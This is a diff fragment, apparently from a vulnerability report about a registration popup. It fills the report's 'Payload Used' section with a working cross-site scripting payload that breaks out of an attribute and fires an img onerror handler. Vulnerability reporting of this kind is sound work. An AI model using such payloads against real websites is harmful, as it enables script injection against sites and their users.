@@ -51,7 +51,7 @@ The registration functionality is accessible through a popup on the main applica
 ## Payload Used
 
 ```text
-[Insert the exact XSS payload used during testing]
+tanishq'"><Img SRc=x ONeRRor=confirm(1)>
 ```
 
 ## Proof of Concept
